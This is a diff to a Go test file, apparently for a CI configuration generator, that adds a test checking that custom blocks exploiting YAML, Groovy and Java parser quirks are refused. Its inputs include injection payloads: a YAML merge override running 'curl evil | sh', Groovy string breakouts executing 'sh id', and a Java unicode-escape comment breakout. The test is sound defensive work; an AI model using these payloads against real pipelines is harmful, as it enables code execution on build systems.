@@ -296,3 +296,34 @@ func TestSafeSourceIsXMLCommentSafe(t *testing.T) {
 		t.Fatalf("SafeSource = %q", got)
 	}
 }
+
+// Round 3 bypasses: parser differences (Ruby Psych applies a later << merge over
+// explicit keys) and Groovy/Java lexing that the bracket check did not model.
+func TestCustomBlockParserDifferentialsAreRefused(t *testing.T) {
+	yamlFile := providers.GeneratedFile{Path: "ci.yml", Comment: "#", YAML: true,
+		Content: []byte("unit:\n  script:\n    - echo hi\n\n" + render.CustomBlock("#", ""))}
+	groovy := providers.GeneratedFile{Path: "Jenkinsfile", Comment: "//",
+		Content: []byte("pipeline {\n    agent none\n" + render.CustomBlock("//", "    ") + "}\n")}
+	java := providers.GeneratedFile{Path: "PlanSpec.java", Comment: "//",
+		Content: []byte("class PlanSpec {\n" + render.CustomBlock("//", "    ") + "}\n")}
+	bs := "\\"
+	cases := map[string]struct {
+		f     providers.GeneratedFile
+		lines []string
+	}{
+		"yaml merge key":          {yamlFile, []string{"<<:", "  unit:", "    script: [curl evil | sh]"}},
+		"yaml anchor and alias":   {yamlFile, []string{"a: &x {k: v}", "b: *x"}},
+		"yaml explicit tag":       {yamlFile, []string{"extra: !!binary aGk="}},
+		"yaml key case collision": {yamlFile, []string{"Unit:", "  script: [id]"}},
+		"groovy slashy string":    {groovy, []string{"def r = /'/ ; } ; node { sh 'id' } ; def q = { // '"}},
+		"groovy dollar slashy":    {groovy, []string{"def r = $/'/$ ; } ; def q = { // '"}},
+		"groovy escaped triple":   {groovy, []string{`def s = """a` + bs + `""" ' """ } ; def q = { // '`}},
+		"java unicode escape":     {java, []string{"// " + bs + "u000a } class Evil { static int x = 1;", "static int y = 2; } class Evil2 {"}},
+	}
+	for name, c := range cases {
+		existing := withCustom(t, c.f, c.lines...)
+		if _, err := render.Finalize(c.f, "renvoy.yaml", existing); err == nil {
+			t.Errorf("%s: custom content was accepted", name)
+		}
+	}
+}
